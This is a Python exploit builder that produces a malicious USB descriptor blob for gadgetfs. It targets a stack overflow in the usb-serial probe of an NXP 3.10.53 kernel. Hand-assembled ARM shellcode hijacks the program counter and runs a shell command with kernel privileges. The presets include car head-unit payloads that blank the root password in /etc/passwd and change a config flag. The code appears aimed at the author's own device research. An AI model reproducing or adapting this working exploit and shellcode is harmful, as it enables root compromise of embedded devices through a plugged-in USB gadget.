#!/usr/bin/env python3 -I
# Gadgetfs init blob for the NXP 3.10.53 usb-serial stack overflow.
#
# Chain: fake FTDI (0403:6001) -> ftdi_sio binds -> usb_serial_probe stores
# bulk-in endpoint pointers past bulk_in_endpoint[8]. bulk_in[17] lands in the
# saved-r4 slot, bulk_in[HIJACK] in the saved-LR slot. When probe returns, PC
# = hijack chunk descriptor; its word@4 is `ldr pc,[r4,#off]` where r4 still
# holds chunk#17 and off = (HIJACK-17)*44 + offsetof(usb_host_endpoint,extra).
# That jumps into the hijack chunk's `extra` region = a dense code+data blob
# at the end of the config, which calls call_usermodehelper("/bin/sh",
# ["sh","-c",CMD], {NULL}, UMH_WAIT_PROC).
import struct, sys
from pathlib import Path

BLOB_LEN   = 252          # must be 4-aligned, <= 0xFC (bLength byte doubles
                          # as imm8 of `mov r0,#BLOB_LEN` = blob header word)
EXTRA_OFF  = 32           # offsetof(struct usb_host_endpoint, extra)
STRIDE     = 44           # sizeof(struct usb_host_endpoint)
R4_CHUNK   = 17           # bulk_in[17] -> saved r4 (lab AND car, verified)
VID, PID   = 0x067b, 0x2303   # PL2303: ftdi_sio dies in port_probe (quirk
                              # deref via serial->private clobbered by
                              # serial->port[15]); pl2303 survives: its
                              # .attach rewrites serial->private first.

PRESETS = {
    # name: (n_eps, hijack_idx, helper_addr, cmd)
    # NOTE: lab helper addrs below are for the UMHDBG-instrumented build
    # (patch-umh-debug.py v2, entry printk moves call_usermodehelper next to
    # printk). Rebuilds move them - re-read System.map after every
    # build-kernel.sh run (addrs: gcc16 cross, 2026-10-11).
    'lab': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
    'lab-printk': (26, 25, 0x8042e464, '===BLOB-RAN===\n'),  # debug: blx printk(fmt)
    'lab-nowait': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console', 0),
    # UMH child EFAULTs on kernel-pointer argv; instead make khubd exec directly:
    'lab-execve': (26, 25, 0x800f0ac8, 'echo "===PAYLOAD-RAN===" > /dev/console'),
    # blob self-dump: printk B/sp/argv + slot values, then call UMH, then UDF
    'lab-dump': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
    'car': (27, 26, 0x8003e7c0,
            'mount -o remount,rw / ; '
            "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
            'sync ; reboot -f'),
    # car payload variants: same exploit params, only CMD differs (the lab
    # presets above pin LAB addresses and must never run on the car).
    # sed: passwordless root on the UART console.
    'car-sed': (27, 26, 0x8003e7c0,
                'mount -o remount,rw / ; '
                "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
                'sync ; reboot -f'),
    # cfg: the original goal - AA autoconnect flag (/home/root/cfg), file
    # takes effect on the next device-add, so no reboot; / goes back ro.
    'car-cfg': (27, 26, 0x8003e7c0,
                'mount -o remount,rw / ; '
                'echo autoconnect=true > /home/root/cfg ; '
                'sync ; mount -o remount,ro /'),
    # both: sed + cfg in one shot. Tight fit: ';'-separated without spaces
    # to stay inside the 145-byte CMD budget.
    'car-both': (27, 26, 0x8003e7c0,
                 'mount -o remount,rw /;'
                 "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd;"
                 'echo autoconnect=true>/home/root/cfg;'
                 'sync;reboot -f'),
    # lab-only: car sed command + dump result (mount/reboot make no sense on
    # the lab ramfs; the blob's b . spin blocks init on the 1-cpu VM, so the
    # payload itself must print the file)
    'lab-sed': (26, 25, 0x8042e5f0,
                "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
                'sync ; cat /etc/passwd>/dev/console'),
}

def p32(x): return struct.pack('<I', x)

def pad_cmd(cmd_b, n_eps):
    # The hijack chunk's extra (= blob byte 0) becomes the PC target of
    # `ldr pc,[r4,#off]`. extra = raw config base + 9 + len(cmd_desc) + 9
    # + eps, and the kmalloc'd config buffer is >=8-aligned, so pad cmd with
    # trailing spaces (sh -c ignores them) until that offset is 4-aligned:
    # bit0 must be 0 (odd would flip ldr-to-pc into Thumb state - this is
    # what broke lab27+ after the lab-sed cmd changed the blob offset) and
    # ARM-state code needs a word-aligned PC for real silicon (QEMU is lax).
    while (30 + len(cmd_b) + (n_eps - 1) * 7) % 4:
        cmd_b += b' '
    return cmd_b

def build(preset, dbg_udf=False, name=''):
    global DBG_UDF
    DBG_UDF = dbg_udf
    n_eps, hijack, helper, cmd = preset[:4]
    wait = preset[4] if len(preset) > 4 else 2
    cmd_b = cmd.encode()
    assert b'\x00' not in cmd_b
    assert b'\x04' not in cmd_b and b'\x05' not in cmd_b, 'CMD must avoid 04/05 bytes'
    cmd_b = pad_cmd(cmd_b, n_eps)

    if name == 'lab-dump':
        return build_dump(preset)

    # ---- blob data layout ----
    PATH_OFF  = 76                 # right after the 19-word code block
    DASHC_OFF = PATH_OFF + len(b'/bin/sh\x00')   # 84
    CMD_OFF   = DASHC_OFF + len(b'-c\x00')       # 87, NOT 4-aligned - fine
    data  = b'/bin/sh\x00'
    data += b'-c\x00'
    data += cmd_b + b'\x00'
    while len(data) % 4:
        data += b'\x00'
    ARGV_OFF   = PATH_OFF + len(data)
    data += b'\x00' * 16                       # argv[0..3], filled at runtime
    # envp = &argv[3]: argv[3] is NULL -> envp = {NULL}. No extra bytes.
    HELPER_OFF = PATH_OFF + len(data)
    data += p32(helper)
    blob = b'\x00' * PATH_OFF + data
    assert len(blob) <= BLOB_LEN, f'blob too big: {len(blob)}'
    blob += b'\x00' * (BLOB_LEN - len(blob))

    # ---- blob code (19 words, executes at hijack chunk .extra) ----
    # NB: argv slots live in blob data at B+ARGV_OFF. ip only points at them
    # while filling; the ldr r12 below clobbers ip (r12 IS ip), so every
    # pointer used at the blx is recomputed from a fresh sub r0,pc.
    code  = p32(0xE3A000FC)                    # mov r0,#252  == blob header (bLength 0xFC, type 0x00)
    code += p32(0xE24F000C)                    # sub r0,pc,#12   -> r0 = blob base B
    code += p32(0xE280C000 | ARGV_OFF)         # add ip,r0,#ARGV_OFF
    code += p32(0xE2801000 | PATH_OFF)         # add r1,r0,#PATH_OFF
    code += p32(0xE58C1000)                   # str r1,[ip]      argv[0]
    code += p32(0xE2801000 | DASHC_OFF)        # add r1,r0,#DASHC_OFF
    code += p32(0xE58C1004)                   # str r1,[ip,#4]   argv[1]
    code += p32(0xE2801000 | CMD_OFF)          # add r1,r0,#CMD_OFF
    code += p32(0xE58C1008)                   # str r1,[ip,#8]   argv[2]
    code += p32(0xE3A01000)                   # mov r1,#0
    code += p32(0xE58C100C)                   # str r1,[ip,#12]  argv[3]=NULL
    code += p32(0xE590C000 | HELPER_OFF)       # ldr r12,[r0,#HELPER_OFF]  (clobbers ip - ok)
    code += p32(0xE3A03000 | wait)             # mov r3,#wait    UMH_WAIT_PROC/NO_WAIT
    # pc here = B + 13*4 + 8 = B+60
    code += p32(0xE24F0000 | 60)               # sub r0,pc,#60    -> r0 = B (fresh)
    code += p32(0xE2801000 | ARGV_OFF)         # add r1,r0,#ARGV_OFF  argv
    code += p32(0xE281200C)                   # add r2,r1,#12     envp = &argv[3] = {NULL}
    r0_off = CMD_OFF if preset is PRESETS['lab-printk'] else PATH_OFF
    code += p32(0xE2800000 | r0_off)          # add r0,r0,#r0_off (path or printk fmt)
    code += p32(0xE12FFF3C)                   # blx r12          call helper
    if dbg_udf:
        code += p32(0xE7F000F0)               # DEBUG udf: oops if the call returns
    else:
        code += p32(0xEAFFFFFE)               # b .              spin if it returns
    assert len(code) == 76
    blob = code + blob[len(code):]
    assert blob[0] == 0xFC and blob[1] == 0x00       # descriptor-header bytes
    assert struct.unpack('<I', blob[0:4])[0] == 0xE3A000FC

    return assemble(n_eps, hijack, cmd_b, blob)


def build_dump(preset):
    """Arg-tracer: printk the (path,argv,envp) the blob holds right before
    the blx, call UMH, UDF after. Mirrors the generic tail exactly."""
    n_eps, hijack, helper, cmd = preset[:4]
    cmd_b = pad_cmd(cmd.encode(), n_eps)
    PRINTK = 0x8042e464                       # instrumented-build printk

    # code = 27 words = 108 bytes
    PATH_OFF, DASHC_OFF, CMD_OFF = 108, 116, 119
    data  = b'/bin/sh\x00' + b'-c\x00' + cmd_b + b'\x00'
    data += b'\x00' * (160 - PATH_OFF - len(data))
    ARGV_OFF = 160
    data += b'\x00' * 16                      # argv[0..3]
    HELPER_OFF  = ARGV_OFF + 16                # call_usermodehelper
    PRINTK_OFF  = HELPER_OFF + 4
    data += p32(helper) + p32(PRINTK)
    FMT_OFF = PRINTK_OFF + 4
    data += b'E p=%p a=%p e=%p\n\x00'
    blob = b'\x00' * PATH_OFF + data
    assert len(blob) <= BLOB_LEN, len(blob)
    blob += b'\x00' * (BLOB_LEN - len(blob))

    code  = p32(0xE3A000FC)                    # i0  mov r0,#252 (header)
    code += p32(0xE24F000C)                    # i1  sub r0,pc,#12   r0 = B
    code += p32(0xE1A08000)                    # i2  mov r8,r0
    code += p32(0xE280C000 | ARGV_OFF)         # i3  add ip,r0,#ARGV_OFF
    code += p32(0xE2801000 | PATH_OFF)         # i4  add r1,r0,#PATH_OFF
    code += p32(0xE58C1000)                   # i5  str r1,[ip]
    code += p32(0xE2801000 | DASHC_OFF)        # i6  add r1,r0,#DASHC_OFF
    code += p32(0xE58C1004)                   # i7  str r1,[ip,#4]
    code += p32(0xE2801000 | CMD_OFF)          # i8  add r1,r0,#CMD_OFF
    code += p32(0xE58C1008)                   # i9  str r1,[ip,#8]
    code += p32(0xE3A01000)                   # i10 mov r1,#0
    code += p32(0xE58C100C)                   # i11 str r1,[ip,#12]
    code += p32(0xE598C000 | PRINTK_OFF)       # i12 ldr r12,[r8,#PRINTK_OFF]
    code += p32(0xE24F0000 | 60)               # i13 sub r0,pc,#60   r0 = B (i13@B+52)
    code += p32(0xE2801000 | PATH_OFF)         # i14 add r1,r0,#PATH_OFF
    code += p32(0xE2802000 | ARGV_OFF)         # i15 add r2,r0,#ARGV_OFF
    code += p32(0xE282300C)                   # i16 add r3,r2,#12
    code += p32(0xE2800000 | FMT_OFF)          # i17 add r0,r0,#FMT_OFF
    code += p32(0xE12FFF3C)                   # i18 blx r12  printk("E p=%p a=%p e=%p\n")
    code += p32(0xE598C000 | HELPER_OFF)       # i19 ldr r12,[r8,#HELPER_OFF]
    code += p32(0xE3A03002)                   # i20 mov r3,#2   UMH_WAIT_PROC
    code += p32(0xE24F0000 | 92)               # i21 sub r0,pc,#92  r0 = B (i21@B+84)
    code += p32(0xE2801000 | ARGV_OFF)         # i22 add r1,r0,#ARGV_OFF
    code += p32(0xE281200C)                   # i23 add r2,r1,#12
    code += p32(0xE2800000 | PATH_OFF)         # i24 add r0,r0,#PATH_OFF
    code += p32(0xE12FFF3C)                   # i25 blx r12  call_usermodehelper
    code += p32(0xE7F000F0)                    # i26 udf
    assert len(code) == 108, len(code)
    blob = code + blob[len(code):]
    assert blob[0] == 0xFC and blob[1] == 0x00
    assert struct.unpack('<I', blob[0:4])[0] == 0xE3A000FC

    return assemble(n_eps, hijack, cmd_b, blob)


def assemble(n_eps, hijack, cmd_b, blob):
    # ---- endpoint descriptors ----
    ldr_off = (hijack - R4_CHUNK) * STRIDE + EXTRA_OFF
    ldr_pc  = 0xE594F000 | ldr_off             # ldr pc,[r4,#ldr_off]
    eps = b''
    for i in range(n_eps):
        if i == hijack:
            # bLength=9 (9-byte desc copy), type=5, ep1 IN, attr=0xE2 (bulk+cond AL),
            # bytes 4..7 = ldr pc,[r4,#off]  (wMaxPacketSize=0xF1xx ok: missing maxp fix)
            eps += struct.pack('<BBBB', 9, 5, 0x81, 0xE2) + p32(ldr_pc) + b'\x00'
        else:
            # 7-byte bulk-IN, never executed; maxpacket 64 like lab v1
            eps += struct.pack('<BBBBH B', 7, 5, 0x80 | (i % 15) + 1, 0x02, 64, 0)
    assert len(eps) == (n_eps - 1) * 7 + 9

    # ---- config ----
    cmd_desc = struct.pack('<BB', 2 + len(cmd_b) + 1, 0x00) + cmd_b + b'\x00'
    iface    = struct.pack('<BBBBBBBBB', 9, 4, 0, 0, n_eps, 0xff, 0xff, 0xff, 0)
    body     = cmd_desc + iface + eps + blob
    total    = 9 + len(body)
    cfg      = struct.pack('<BBHBBBBB', 9, 2, total, 1, 1, 0, 0x80, 50) + body
    dev      = struct.pack('<BBHBBBBHHHBBBB', 18, 1, 0x0200, 0, 0, 0, 64,
                           VID, PID, 0x0600, 1, 2, 3, 1)
    blob_file = struct.pack('<I', 0) + cfg + dev
    return blob_file, total, ldr_off

def walk_check(cfg, n_eps_check):
    """Mimic the kernel's two walkers; every landing needs bLength>=2 and
    bLength<=remaining, and walk order must land on descriptors exactly."""
    total = struct.unpack('<H', cfg[2:4])[0]
    assert len(cfg) == total
    # counting loop (first pass)
    p, size = 9, total - 9
    landings = []
    while size > 0:
        bl, ty = cfg[p], cfg[p + 1]
        landings.append((p, bl, ty))
        assert 2 <= bl <= size, f'bad descriptor at {p}: len {bl} size {size}'
        p += bl; size -= bl
    assert size == 0
    types = [t for _, _, t in landings]
    assert types.count(4) == 1 and types.count(5) == n_eps_check, landings
    return landings

if __name__ == '__main__':
    name = sys.argv[1] if len(sys.argv) > 1 else 'lab'
    dbg = False
    if name == 'lab-udf':
        name, dbg = 'lab', True
    assert name in PRESETS, name
    out = sys.argv[2] if len(sys.argv) > 2 else str(Path(__file__).resolve().parent / 'tmp' / 'ftdi_blob')
    blob_file, total, ldr_off = build(PRESETS[name], dbg_udf=dbg, name=name)
    cfg = blob_file[4:4 + total]
    landings = walk_check(cfg, PRESETS[name][0])
    with open(out, 'wb') as f:
        f.write(blob_file)
    print(f'preset={name}{" udf" if dbg else ""} file={out} bytes={len(blob_file)} '
          f'cfg_total={total} n_desc_landings={len(landings)} ldr_pc_off={ldr_off:#x}')
